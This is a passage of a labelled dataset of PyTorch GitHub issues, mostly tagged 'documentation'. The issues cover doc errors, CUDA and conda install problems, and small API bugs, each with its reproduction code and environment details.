torch.exp(log_std))\r\n\r\nprint(n.scale)\r\n```\r\nreturns:\r\n`tensor([[0.0444, 0.0060]], grad_fn=<ExpBackward>)`\r\n\r\n## Environment\r\n\r\nCollecting environment information...\r\nPyTorch version: 1.1.0.post2\r\nIs debug build: No\r\nCUDA used to build PyTorch: None\r\n\r\nOS: Mac OSX 10.14.5\r\nGCC version: Could not collect\r\nCMake version: Could not collect\r\n\r\nPython version: 3.7\r\nIs CUDA available: No\r\nCUDA runtime version: No CUDA\r\nGPU models and configuration: No CUDA\r\nNvidia driver version: No CUDA\r\ncuDNN version: No CUDA\r\n\r\nVersions of relevant libraries:\r\n[pip3] numpy==1.15.1\r\n[pip3] numpydoc==0.8.0\r\n[pip3] torch==1.1.0.post2\r\n[conda] blas                      1.0                         mkl\r\n[conda] mkl                       2019.0                      118\r\n[conda] mkl-service               1.1.2            py37h6b9c3cc_5\r\n[conda] mkl_fft                   1.0.4            py37h5d10147_1\r\n[conda] mkl_random                1.0.1            py37h5d10147_1\r\n[conda] torch                     1.1.0.post2               <pip>\r\n\r\n## Additional context\r\nN/A\r\n"},{"labels":[null,"documentation",null,null],"text":"The Transformer implementation docs (https://pytorch.org/docs/stable/nn.html?highlight=transformer#torch.nn.Transformer) state that they implement the original paper but fail to acknowledge that they don’t implement the following: \r\n* Layer Norm as the default normalization option. \r\n* Positional Encodings\r\n* Embeddings before the encoding and decoding step \r\n\r\nIt’s fine that these are all not implemented directly in the module but making it more clear that they aren’t and were in the original paper would be helpful. "},{"labels":["documentation",null,null],"text":"See https://github.com/pytorch/pytorch/issues/24380#issuecomment-522294803\r\n"},{"labels":[null,null,"documentation",null],"text":"It seems that the LibTorch download links on the PyTorch website are wrong for both Linux and Mac. When selecting Stable(1.2) the provided link points to nightly builds; specifically nightly latest, which will currently download a 1.3 dev build.\r\n\r\n### Example download configuration:\r\n![Screen Shot 2019-08-14 at 9 00 17 PM](https://user-images.githubusercontent.com/30844227/63067898-bc1ff300-bed6-11e9-9d9f-4b072342da3b.png)\r\n\r\n### Contents of build-version file:\r\n`1.3.0.dev20190814+cpu`\r\n\n\ncc @ezyang @gchanan"},{"labels":[null,"documentation",null],"text":"## 📚 Documentation\r\nBased on these two docs:\r\nhttps://pytorch.org/docs/stable/distributed.html#torch.distributed.init_process_group\r\nhttps://pytorch.org/tutorials/intermediate/dist_tuto.html\r\n\r\nFor function `init_process_group`, the parameter `world_size` and `rank` are optional. They are only required if `store` is specified. \r\n\r\nWhen I tried it out, this function will throw an error for missing those two parameters even if I am not using `store`. \r\n\r\nThe code that produces this error is as below: \r\n`dist.init_process_group('nccl', init_method='file:///philly/wu3/ipgsp/xuzhu/torch_dist/ips')`\r\n\r\nThe error message is as below:\r\n[1,6]<stderr>:  File \"/philly/wu3/ipgsp/xuzhu/torch_dist/torch_dist_run2.py\", line 59, in <module>\r\n[1,6]<stderr>:    dist.init_process_group('nccl', init_method='file:///philly/wu3/ipgsp/xuzhu/torch_dist/ips')\r\n[1,6]<stderr>:  File \"/opt/conda/lib/python3.6/site-packages/torch/distributed/distributed_c10d.py\", line 406, in init_process_group\r\n[1,6]<stderr>:    store, rank, world_size = next(rendezvous(url))\r\n[1,6]<stderr>:  File \"/opt/conda/lib/python3.6/site-packages/torch/distributed/rendezvous.py\", line 66, in _file_rendezvous_handler\r\n[1,6]<stderr>:    raise _error(\"rank parameter missing\")\r\n[1,6]<stderr>:   ValueError: Error initializing torch.distributed using file:// rendezvous: rank parameter missing\r\n\r\nEven I supply with a rank, it will then complain about work_size is missing.\r\n\r\nSo without `store` being used, those two parameters are not optional still. Missing them in the script would cause an error.\r\n"},{"labels":[null,"documentation",null],"text":"## 🐛 Bug\r\nWhen installing pytorch with conda in a new environment, it always installs compiled with the cuda version 10 and cudatoolkit=10.0. Whether I conda install pytorch 1.2, 1.1, 1.0.1, or 1.0 with cuda90 it always tries to install the cuda 10 version of the package as well as cudatoolkit=10.0. This is via the pytorch conda channel. My machine has an older driver version that can't easily be upgraded. I also tried pip installing from https://download.pytorch.org/whl/cu90/stable and it still insists on using cuda 10.\r\n\r\n## To Reproduce\r\nconda create --name test_env python=3.6\r\nconda activate test_env\r\nconda install pytorch=1.1 cuda90 -c pytorch\r\nconda list\r\n\r\nIn python when you run torch.version.cuda it also lists cuda 10.\r\n\r\nThe following NEW packages will be INSTALLED:\r\n\r\n    blas:           1.0-mkl\r\n    cffi:           1.12.3-py36h2e261b9_0\r\n    cuda90:         1.0-h6433d27_0                        pytorch\r\n    cudatoolkit:    10.0.130-0\r\n    intel-openmp:   2019.4-243\r\n    libgfortran-ng: 7.3.0-hdf63c60_0\r\n    mkl:            2019.4-243\r\n    mkl_fft:        1.0.12-py36ha843d7b_0\r\n    mkl_random:     1.0.2-py36hd81dba3_0\r\n    ninja:          1.9.0-py36hfd86e86_0\r\n    numpy:          1.16.4-py36h7e9f1db_0\r\n    numpy-base:     1.16.4-py36hde5b4d6_0\r\n    pycparser:      2.19-py36_0\r\n    pytorch:        1.1.0-py3.6_cuda10.0.130_cudnn7.5.1_0 pytorch\r\n\r\nProceed ([y]/n)? n\r\n\r\n## Expected behavior\r\n\r\nShould be able to select the cuda version.\r\n\r\n## Environment\r\n\r\nCollecting environment information...\r\nPyTorch version: N/A\r\nIs debug build: N/A\r\nCUDA used to build PyTorch: N/A\r\n\r\nOS: Ubuntu 16.04.3 LTS\r\nGCC version: (Ubuntu 5.4.0-6ubuntu1~16.04.10) 5.4.0 20160609\r\nCMake version: version 3.5.1\r\n\r\nPython version: 3.6\r\nIs CUDA available: N/A\r\nCUDA runtime version: Could not collect\r\nGPU models and configuration:\r\nGPU 0: TITAN Xp\r\nGPU 1: TITAN Xp\r\nGPU 2: TITAN Xp\r\nGPU 3: TITAN Xp\r\n\r\nNvidia driver version: 390.67\r\ncuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.1.3\r\n\r\nVersions of relevant libraries:\r\n[pip] Could not collect\r\n[conda] Could not collect\r\n\r\n"},{"labels":["documentation",null,null],"text":"A proposal: add `_t` and `_{t+1}` (or `_{t-1}`) indices in appropriate places. It will be clearer what's happening and more aligned to the formulas typically used in optimization papers.\r\n\r\nCurrently: `v=ρ∗v+g`\r\n\r\nProposed: `v_{t+1}=ρ∗v_{t}+g_{t+1}`\r\n\r\nhttps://pytorch.org/docs/master/optim.html?highlight=sgd#torch.optim.SGD"},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\nOur friends at Google (specifically, Android) have built a wasdwebassemblyl-based tracing tool at https://ui.perfetto.dev/#!/viewer (source code to manually trace at https://android.googlesource.com/platform/external/perfetto/+/refs/heads/master/test/client_api_example.cc).\r\n\r\nI think PyTorch could make use of that, or at least point to it in its documentation?\r\n\r\nExample of uploaded trace: https://ui.perfetto.dev/#!/?s=c33b3f7ea24e145ed13a52196e1eb5e121334d53c7de6cedead7387a5f3c72"},{"labels":["documentation"],"text":"## 📚 Documentation\r\nThe documentation of [`Tensor.add_()`](https://pytorch.org/docs/stable/tensors.html#torch.Tensor.add_) says that it is an in-place version of `add()`, which in turn refer to [`torch.add()`](https://pytorch.org/docs/stable/torch.html#torch.add). However, at no place does it say that the result is scaled by an optional second argument.\r\nThat is `a.add_(10,b)` equals `a += 10 * b` where `a` and `b` are tensors."},{"labels":[null,"documentation",null,null],"text":"## 🚀 Feature\r\n<!-- A clear and concise description of the feature proposal -->\r\nRather than or in addition to having dependencies as submodules, it would also be helpful to list them separately, indicating typical configurations and allowing the user the option of informing cmake where the dependencies are installed.\r\n\r\n## Motivation\r\n\r\n<!-- Please outline the motivation for the proposal. Is your feature request related to a problem? e.g., I'm always frustrated when [...]. If this is related to another GitHub issue, please link here too -->\r\n\r\nIt can be frustrating to build from source with dependencies breaking the build, for example issues with the automated installation of MKL DNN and Caffe seem to break the default installation. Furthermore, each of the dependencies has a rather wide choice of configuration options that can affect performance.\r\n\r\n## Pitch\r\n\r\n<!-- A clear and concise description of what you want to happen. -->\r\n\r\nAn improved installation README.md document which lists the dependencies, where they are used, how the impact performance and which ones are critical.\r\n\r\n## Alternatives\r\n\r\n<!-- A clear and concise description of any alternative solutions or features you've considered, if any. -->\r\n\r\nUse of Spack for installation - https://spack.io/\r\n\r\n## Additional context\r\n\r\n<!-- Add any other context or screenshots about the feature request here. -->\r\n"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nThe documentation for the torch.argmax function (shown here: [https://pytorch.org/docs/stable/torch.html] states: \"Returns the indices of all elements in the input tensor.\"  This is simply wrong, it should read \"Returns the index of the maximum of all values in the input tensor (across all dimensions).\r\n"},{"labels":[null,"documentation",null],"text":"## 📚 Documentation\r\n\r\nPyTorch doesn't seem to disagree to use multiple CUDA streams. It provides several useful APIs, such as `torch.cuda.current_stream()` and `torch.cuda.Event`, to control streams at the application level.\r\n\r\nBut multiple streams on the same GPU may cause memory corruption. It's related to `CUDACachingAllocator`.\r\n\r\n> Allocations are associated with a stream. Once freed, blocks can be re-allocated on the same stream, ...\r\n\r\nThe allocator records the stream in which a block was allocated for a tensor to detect when it can be safely freed. But the tensor can be accessed in another stream. In this case, the block might be reallocated before the access has finished. For example, let's assume we allocated a tensor at the default stream, and another stream copies the tensor. In this case, a block of the tensor might be reallocated for a new tensor at the default stream.\r\n\r\nIt seems that memory corruption can be prevented by `Tensor.record_stream()` effectively. If I understood correctly, this API makes the allocator detect the time when the blocks can be freed safely. But `Tensor.record_stream()` is not documented yet. So we shouldn't use it at the application level.\r\n\r\nI suggest making `Tensor.record_stream()` as a public API. It would be very useful to develop multi-stream applications with less unpredictable bugs."},{"labels":["documentation",null],"text":"We have `test_empty_strided`, but maybe we don't want it to be a public API? \r\n\r\nI'm not sure about this... "},{"labels":["documentation",null,null],"text":"We have test coverage for it but no documentation. "},{"labels":[null,"documentation",null],"text":"The future package should be mentioned in the list of dependencies for building from source with python 2.7 on https://pytorch.org/get-started/locally/\r\n\r\n## Environment\r\n\r\nPyTorch version: 1.2.0a0+722e5b1\r\nIs debug build: No\r\nCUDA used to build PyTorch: Could not collect\r\n\r\nOS: Ubuntu 18.04.1 LTS\r\nGCC version: (Ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0\r\nCMake version: version 3.14.0\r\n\r\nPython version: 2.7\r\nIs CUDA available: No\r\nCUDA runtime version: Could not collect\r\nGPU models and configuration:\r\nGPU 0: Quadro GP100\r\nGPU 1: Quadro GP100\r\n\r\nNvidia driver version: 410.79\r\ncuDNN version: Could not collect\r\n\r\nVersions of relevant libraries:\r\n[pip] numpy==1.16.4\r\n[pip] torch==1.2.0a0+722e5b1\r\n[conda] blas                      1.0                         mkl\r\n[conda] mkl                       2019.4                      243\r\n[conda] mkl-include               2019.4                      243\r\n[conda] mkl_fft                   1.0.12           py27ha843d7b_0\r\n[conda] mkl_random                1.0.2            py27hd81dba3_0\r\n[conda] torch                     1.2.0a0+722e5b1          pypi_0    pypi"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n`torch.nn.Upsample()` shares the same undeterministic backward issue with `torch.nn.functional.upsample()`, which could not be easily turned off using CuDNN flag. But in the documentation, we didn't state that. Can we add the documentation for `torch.nn.Upsample()`?\r\n"},{"labels":["documentation",null],"text":"`torch.bitwise_not()\r\nbitwise_not(input, out=None) -> Tensor\r\n\r\nComputes the bitwise NOT of the given input tensor. The input must be of integer or Boolean types.\r\n\r\nParameters\r\n{input} –\r\n\r\n{out} –\r\n\r\nExample:\r\n\r\n>>> torch.bitwise_not(torch.tensor([-1, -2, 3], dtype=torch.int8))\r\ntensor([ 0,  1, -4], dtype=torch.int8)`\r\n\r\nSee the substitutions are being displayed raw."},{"labels":[null,"documentation",null],"text":"Hello everyone,\r\n\r\njust wanted to let you know that I started this repo:\r\n\r\nhttps://github.com/nmilosev/pytorch-arm-builds\r\n\r\nwhich contains builds for ARM devices and some inference tests. Everything is working good, it would maybe be nice to put this link somewhere visible so that people know it exists. I intend to update this with every pytorch and torchvision release.\r\n\r\nHope this is ok.\r\n\r\nThanks for everything! :)"},{"labels":["documentation",null,null],"text":"The official website does not provide the torchvison version installation method.\r\nHere is the error message  when torchvison 0.3.0 is used.\r\ntorchvision/_C.cpython-36m-x86_64-linux-gnu.so: undefined symbol: _ZN2at7getTypeERKNS_6TensorE\r\n\r\nThat should be caused by the mismatch version  between pytorch-nightly and torchvision  0.3.0.\r\n\r\n"},{"labels":[null,"documentation",null,null],"text":"## 🐛 Bug\r\n\r\nThis is a niche bug, but it might cause troubles in advanced users who like to use masking to filter out NaN losses. Simply put, when NaN losses are masked out using `masked_fill`, performing `backward` on the sum of the losses should produce valid gradients (assuming that the gradient graph is smooth everywhere except for the masked losses). When \r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\nDefine the environment as follows. We will be backpropagating gradients to a very simple `nn.Linear` layer.\r\n\r\n```python\r\nimport torch\r\nimport torch.nn as nn\r\nx = torch.ones(3, 4)\r\nlinear = nn.Linear(4, 2)\r\ndef has_err(x):\r\n    return bool(((x != x) | (x == float(\"inf\")) | (x == float(\"-inf\"))).any().item())\r\n```\r\n\r\nPerforming a forward inference on the linear layer and propagating gradients from there works as intended if no `nan` is involved.\r\n\r\n```python\r\nlinear(x).sum().backward()\r\nprint(linear.weight.grad)\r\n# tensor([[3., 3., 3., 3.],\r\n#         [3., 3., 3., 3.]])\r\nassert not has_err(linear.weight.grad)\r\n```\r\n\r\nSuppose that `x` has `nan` in one of its rows.\r\n\r\n```python\r\nx[2].fill_(float(\"nan\"))\r\nprint(linear(x))\r\n# tensor([[ 0.0570, -1.0066],\r\n#         [ 0.0570, -1.0066],\r\n#         [    nan,     nan]], grad_fn=<AddmmBackward>)\r\n```\r\n\r\nPerforming backwards computation on the sum of the matrix above should\r\nproduce `nan` gradients. This is expected.\r\n\r\n```python\r\nlinear.zero_grad()\r\nlinear(x).sum().backward()\r\nprint(linear.weight.grad)\r\n# tensor([[nan, nan, nan, nan],\r\n#         [nan, nan, nan, nan]])\r\nassert has_err(linear.weight.grad)\r\n```\r\n\r\nHowever, using `masked_fill` or  index slicing on the leaf nodes to mask out problematic gradient graphs should not.\r\n\r\n```python\r\nlinear.zero_grad()\r\nlinear(x)[:2].sum().backward()\r\nassert not has_err(linear.weight.grad)  # AssertionError raised\r\n```\r\nWe can check whether masking out final losses works in cases where no `nan` is involved.\r\n\r\n```python\r\nx = torch.ones(3, 4)\r\nx[2].fill_(0.5)\r\nlinear.zero_grad()\r\nlinear(x).sum().backward()\r\nprint(linear.weight.grad)\r\n# without masking:\r\n# tensor([[2.5000, 2.5000, 2.5000, 2.5000],\r\n#         [2.5000, 2.5000, 2.5000, 2.5000]])\r\nlinear.zero_grad()\r\nlinear(x)[2:].sum().backward()\r\nprint(linear.weight.grad)\r\n# with masking:\r\n# tensor([[2., 2., 2., 2.],\r\n#         [2., 2., 2., 2.]])\r\n```\r\n\r\nThe accumulated gradient in the latter case is less than the former because index slicing (`[2:]`) on the computation graph prevented the third row in `x` from affecting the gradient computation.\r\n\r\n## Environment\r\n\r\nCollecting environment information...\r\nPyTorch version: 1.0.0\r\nIs debug build: No\r\nCUDA used to build PyTorch: None\r\n\r\nOS: Mac OSX 10.14.5\r\nGCC version: Could not collect\r\nCMake version: Could not collect\r\n\r\nPython version: 3.7\r\nIs CUDA available: No\r\nCUDA runtime version: No CUDA\r\nGPU models and configuration: No CUDA\r\nNvidia driver version: No CUDA\r\ncuDNN version: No CUDA\r\n\r\nVersions of relevant libraries:\r\n[pip] numpy==1.16.3\r\n[pip] torch==1.0.0\r\n[conda] torch                     1.0.0                     <pip>\r\n\r\n## Additional context\r\n\r\nNone.\r\n"},{"labels":[null,null,"documentation",null],"text":"See https://github.com/pytorch/pytorch/issues/18619#issuecomment-479929030 and https://github.com/pytorch/pytorch/issues/18619#issuecomment-480863624\r\n\r\nWhen an intermediate result is an implicit input to backwards, we must explicitly define a derivative for it. This requirement isn't documented anywhere but it should be. Even better if we can warn if someone runs higher order derivative and there's a function that violated this constraint in the graph.\r\n\r\ncc @ezyang @SsnL @albanD @zou3519 @gqchen @jhrmnn"},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\nbased on dicussion here:\r\n\r\nhttps://discuss.pytorch.org/t/why-lengths-should-be-given-in-sorted-order-in-pack-padded-sequence/3540/10\r\n\r\n`pack_padded_sequence`\r\n\r\ndoes not need sorting anymore, so perhaps the fact the docs mention sorting at all should be deleted. \r\n\r\n> For unsorted sequences, use enforce_sorted = False. If enforce_sorted is True, the sequences should be sorted by length in a decreasing order, i.e. input[:,0] should be the longest sequence, and input[:,B-1] the shortest one. enforce_sorted = True is only necessary for ONNX export."},{"labels":[null,"documentation",null],"text":"`torch.diagonal` uses `dim1` and `dim2` while `torch.transpose` uses `dim0` and `dim1`."},{"labels":[null,null,"documentation",null,null,null,null,null],"text":"## 🐛 Bug\r\npytorch 1.1.0 Conv2d with dilation > 1 crashes on CPU, but runs perfectly on GPU\r\n\r\n## Code sample\r\nimport torch \r\nimport torch.nn as nn\r\nconv = nn.Conv2d(in_channels=3, out_channels=8, kernel_size=3, stride=1, padding=2, dilation=2)\r\nx = torch.randn(1,3,16,16)\r\ny = conv(x) ## this crashes\r\nconv.cuda(); y = conv(x.cuda())  ## this runs\r\n\r\n## Environment\r\nPyTorch version: 1.1.0\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.0.130\r\n\r\nOS: Ubuntu 16.04.6 LTS\r\nGCC version: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609\r\nCMake version: version 3.5.1\r\n\r\nPython version: 3.6\r\nIs CUDA available: Yes\r\nCUDA runtime version: 10.0.130\r\nGPU models and configuration: GPU 0: GeForce GTX 1060 6GB\r\nNvidia driver version: 418.39\r\ncuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.1"},{"labels":[null,null,"documentation",null,null,null],"text":"## 🐛 Bug\r\n\r\n<!-- A clear and concise description of what the bug is. -->\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n\r\n1. When I use c++ to deploy my model ,I need to rite a NMS function ,I found torch::conv2d() needs a param I can't provide\r\n  \r\n2.my source code is \r\n```\r\ntorch::Tensor soft_nms_3d(torch::Tensor scale_logits, int ksize, float com_strength) {\r\n    int num_scales = scale_logits.sizes()[3];\r\n    torch::Tensor max_each_scale = torch::max_pool2d(scale_logits.permute({0, 3, 1, 2}), {ksize, ksize}, {1},\r\n                                                     {int(ksize / 2)}).permute({0, 2, 3, 1});\r\n    std::tuple<torch::Tensor, torch::Tensor> torch_max_tmp = torch::max(max_each_scale, -1, true);\r\n    torch::Tensor max_all_scale;\r\n    torch::Tensor max_all_scale_idx;\r\n    std::tie(max_all_scale, max_all_scale_idx) = torch_max_tmp;\r\n    torch::Tensor exp_maps = torch::exp(com_strength * (scale_logits - max_all_scale));\r\n\r\n    torch::Tensor input = exp_maps.permute({0, 3, 1, 2});\r\n    torch::Tensor weight = torch::full({1, num_scales, ksize, ksize, 1}, 1);\r\n    torch::Tensor bias=torch::ones({0});\r\n    torch::Tensor sum_exp = torch::conv2d(input,weight,bias,{1},{int(ksize/2)},0,1);\r\n\r\n    torch::Tensor probs = exp_maps / (sum_exp + 1e-8);\r\n    return probs;\r\n}\r\n```\r\n3. And thrown error is:\r\n```\r\nterminate called after throwing an instance of 'c10::Error'\r\n  what():  expected output_padding to be a single integer value or a list of 3 values to match the convolution dimensions, but got output_padding=[0, 0] (convolution_expand_param_if_needed at /home/wang/software/pytorch/aten/src/ATen/native/Convolution.cpp:286)\r\nframe #0: c10::Error::Error(c10::SourceLocation, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&) + 0x6a (0x7fc42195a43a in /home/wang/software/pytorch/torch/lib/tmp_install/lib/libc10.so)\r\nframe #1: <unknown function> + 0x52aa4a (0x7fc433c2da4a in /home/wang/software/pytorch/torch/lib/tmp_install/lib/libcaffe2.so)\r\nframe #2: at::native::_convolution(at::Tensor const&, at::Tensor const&, at::Tensor const&, c10::ArrayRef<long>, c10::ArrayRef<long>, c10::ArrayRef<long>, bool, c10::ArrayRef<long>, long, bool, bool, bool) + 0x3c6 (0x7fc433c33c56 in /home/wang/software/pytorch/torch/lib/tmp_install/lib/libcaffe2.so)\r\nframe #3: at::TypeDefault::_convolution(at::Tensor const&, at::Tensor const&, at::Tensor const&, c10::ArrayRef<long>, c10::ArrayRef<long>, c10::ArrayRef<long>, bool, c10::ArrayRef<long>, long, bool, bool, bool) const + 0xfd (0x7fc433fcb95d in /home/wang/software/pytorch/torch/lib/tmp_install/lib/libcaffe2.so)\r\nframe #4: torch::autograd::VariableType::_convolution(at::Tensor const&, at::Tensor const&, at::Tensor const&, c10::ArrayRef<long>, c10::ArrayRef<long>, c10::ArrayRef<long>, bool, c10::ArrayRef<long>, long, bool, bool, bool) const + 0x2a7 (0x7fc43b2aece7 in /home/wang/software/pytorch/torch/lib/tmp_install/lib/libtorch.so.1)\r\nframe #5: at::native::convolution(at::Tensor const&, at::Tensor const&, at::Tensor const&, c10::ArrayRef<long>, c10::ArrayRef<long>, c10::ArrayRef<long>, bool, c10::ArrayRef<long>, long) + 0xe0 (0x7fc433c2c660 in /home/wang/software/pytorch/torch/lib/tmp_install/lib/libcaffe2.so)\r\nframe #6: at::TypeDefault::convolution(at::Tensor const&, at::Tensor const&, at::Tensor const&, c10::ArrayRef<long>, c10::ArrayRef<long>, c10::ArrayRef<long>, bool, c10::ArrayRef<long>, long) const + 0xc6 (0x7fc433fcb7d6 in /home/wang/software/pytorch/torch/lib/tmp_install/lib/libcaffe2.so)\r\nframe #7: torch::autograd::VariableType::convolution(at::Tensor const&, at::Tensor const&, at::Tensor const&, c10::ArrayRef<long>, c10::ArrayRef<long>, c10::ArrayRef<long>, bool, c10::ArrayRef<long>, long) const + 0x83 (0x7fc43b2b3ca3 in /home/wang/software/pytorch/torch/lib/tmp_install/lib/libtorch.so.1)\r\nframe #8: at::native::conv2d(at::Tensor const&, at::Tensor const&, at::Tensor const&, c10::ArrayRef<long>, c10::ArrayRef<long>, c10::ArrayRef<long>, long) + 0xaf (0x7fc433c2bfbf in /home/wang/software/pytorch/torch/lib/tmp_install/lib/libcaffe2.so)\r\nframe #9: at::TypeDefault::conv2d(at::Tensor const&, at::Tensor const&, at::Tensor const&, c10::ArrayRef<long>, c10::ArrayRef<long>, c10::ArrayRef<long>, long) const + 0xbc (0x7fc433fcbeec in /home/wang/software/pytorch/torch/lib/tmp_install/lib/libcaffe2.so)\r\nframe #10: torch::autograd::VariableType::conv2d(at::Tensor const&, at::Tensor const&, at::Tensor const&, c10::ArrayRef<long>, c10::ArrayRef<long>, c10::ArrayRef<long>, long) const + 0x75 (0x7fc43b374e75 in /home/wang/software/pytorch/torch/lib/tmp_install/lib/libtorch.so.1)\r\nframe #11: soft_nms_3d(at::Tensor, int, float) + 0x54f (0x407a1f in ./rfnet)\r\nframe #12: main + 0x77c (0x4069cc in ./rfnet)\r\nframe #13: __libc_start_main + 0xf0 (0x7fc421004830 in /lib/x86_64-linux-gnu/libc.so.6)\r\nframe #14: _start + 0x29 (0x407069 in ./rfnet)\r\n```\r\n\r\n<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->\r\n\r\n## Expected behavior\r\n\r\nI need a c++ interface of conv2d function which can fill weights and bias to do convolution ,this job also can be done through other functions, but I think this function may exists errors.\r\n<!-- A clear and concise description of what you expected to happen. -->\r\n\r\n## Environment\r\nCollecting environment information...\r\nPyTorch version: 1.1.0\r\nIs debug build: No\r\nCUDA used to build PyTorch: 9.0.176\r\n\r\nOS: Ubuntu 16.04.6 LTS\r\nGCC version: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609\r\nCMake version: version 3.5.1\r\n\r\nPython version: 3.6\r\nIs CUDA available: Yes\r\nCUDA runtime version: 7.5.17\r\nGPU models and configuration: GPU 0: GeForce GTX 1060\r\nNvidia driver version: 390.87\r\ncuDNN version: Could not collect\r\n\r\nVersions of relevant libraries:\r\n[pip] numpy==1.16.4\r\n[pip] torch==1.1.0\r\n[pip] torchvision==0.3.0\r\n[conda] blas                      1.0                         mkl  \r\n[conda] mkl                       2019.4                      243  \r\n[conda] mkl_fft                   1.0.12           py36ha843d7b_0  \r\n[conda] mkl_random                1.0.2            py36hd81dba3_0  \r\n[conda] pytorch                   1.1.0           py3.6_cuda9.0.176_cudnn7.5.1_0    pytorch\r\n[conda] torchvision               0.3.0           py36_cu9.0.176_1    pytorch\r\n"},{"labels":[null,null,"documentation",null],"text":"I am trying to train a model in a spicific GPU by using CUDA_VISIBLE_DEVICES in my script. However, unknown processes start running on other gpus that are not specified in the CUDA_VISIBLE_DEVICES. When they start running, batch training time takes very long time. When I kill those processes, batch training time goes back normal. However, the processes keep starting randomly.\r\n\r\nSame problem is happening in other Machine as we. It is worth mentioning I am running pytorch inside docker using nvidia-docker.\r\n\r\nError messages and stack traces are also helpful.\r\nI only specified CUDA_VISIBLE_DEVICES=0. however, those other process keep running randomly even after I kill them.\r\n\r\n<img width=\"724\" alt=\"Screen Shot 2019-07-19 at 7 49 21 AM\" src=\"https://user-images.githubusercontent.com/8367757/61510048-ef678300-a9f9-11e9-9956-0fc0c1139a56.png\">\r\n\r\nTraining time before those processes started and after I killed them. You can see how they make batch training time explode.\r\n\r\n<img width=\"736\" alt=\"Screen Shot 2019-07-19 at 7 50 15 AM\" src=\"https://user-images.githubusercontent.com/8367757/61510162-76b4f680-a9fa-11e9-92d0-372b1a8bcab1.png\">\r\n\r\n\r\n\r\n## System Info\r\nCollecting environment information...\r\nPyTorch version: 1.1.0\r\nIs debug build: No\r\nCUDA used to build PyTorch: 9.0.176\r\n\r\nOS: Ubuntu 18.04.2 LTS\r\nGCC version: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0\r\nCMake version: Could not collect\r\n\r\nPython version: 2.7\r\nIs CUDA available: Yes\r\nCUDA runtime version: 10.0.130\r\nGPU models and configuration:\r\nGPU 0: GeForce GTX TITAN X\r\nGPU 1: GeForce GTX TITAN X\r\n\r\nNvidia driver version: 410.78\r\ncuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.5.1\r\n\r\nVersions of relevant libraries:\r\n[pip] numpy==1.16.4\r\n[pip] torch==1.1.0\r\n[pip] torchvision==0.3.0\r\n\r\n\r\n"},{"labels":[null,"documentation",null],"text":"## 🐛 Bug\r\n\r\nConcatDataset returns different error messages setting out of range plus index and minus index. \r\n\r\n## To Reproduce\r\n```\r\n>>> import torch\r\n>>> from torch.utils import data\r\n>>> x=data.ConcatDataset((range(10),range(10)))\r\n>>> x[-100]\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\n  File \"/home/mueda/code/python/rc/doc/.venv/lib/python3.7/site-packages/torch/utils/data/dataset.py\", line 78, in __getitem__\r\n    raise ValueError(\"absolute value of index should not exceed dataset length\")\r\nValueError: absolute value of index should not exceed dataset length\r\n>>> x[100]\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\n  File \"/home/mueda/code/python/rc/doc/.venv/lib/python3.7/site-packages/torch/utils/data/dataset.py\", line 85, in __getitem__\r\n    return self.datasets[dataset_idx][sample_idx]\r\nIndexError: list index out of range\r\n```\r\n## Expected behavior\r\nI think it's better that x[100] and x[-100] have the same error message.\r\n\r\nMy way to solve this is to chage [these lines](https://github.com/pytorch/pytorch/blob/master/torch/utils/data/dataset.py#L197-L200) like this.\r\n```\r\n        if idx < 0:\r\n            idx = len(self) + idx\r\n        if not (0 <= idx < len(self)):\r\n            raise ValueError(\"absolute value of index should not exceed dataset length\")\r\n```\r\n\r\n## Environment\r\n - PyTorch Version (e.g., 1.0): 1.1.0\r\n - OS (e.g., Linux): Ubuntu 18.04\r\n - How you installed PyTorch (`conda`, `pip`, source): pip\r\n - Python version: Python 3.7.3\r\n - CUDA/cuDNN version: None\r\n - GPU models and configuration: None\r\n\r\n"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nI think this example given in https://github.com/pytorch/pytorch/blob/9c4c9c3af042498144c40b30d64443cca943906a/torch/_torch_docs.py about broadcasting is confusing:\r\n\r\nIn lines 3174 to 3176:\r\n\r\n> \r\nFor example, if :attr:`tensor1` is a :math:`(j \\times 1 \\times n \\times m)` tensor and :attr:`tensor2` is a :math:`(k \\times m \\times p)` tensor, :attr:`out` will be an :math:`(j \\times k \\times n \\times p)` tensor.\r\n\r\nthe first and second trailing dimensions of `tensor1` and `tensor2` don't match, assuming obviously that `m` is not equal to neither `p` or  `n`, and neither of those three dimensions is 1.\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n"},{"labels":["documentation",null],"text":"TL;DR: the default `affine` value is different from the original paper and code, but is probably too old to change. Can we add a note in doc?\r\n\r\nI happened to be looking through the original paper on [Instance Normalization](https://arxiv.org/pdf/1701.02096.pdf) and the accompanied [code](https://github.com/DmitryUlyanov/texture_nets/blob/aad2cc6f8a998fedc77b64bdcfe1e2884aa0fb3e/InstanceNormalization.lua#L16-L20). Both seem to indicate that the affine transform should be on **by default**. E.g., quote from the paper:\r\n\r\n> Another similarity with BN is that each IN layer is followed by a scaling and bias operator s\fx+b.\r\n\r\nHowever, since the very beginning of `nn.InstanceNorm*d`'s existence ([this PR](https://github.com/pytorch/pytorch/pull/1283)), `affine=False` is the default.\r\n\r\nIs it worthwhile to add a `.. 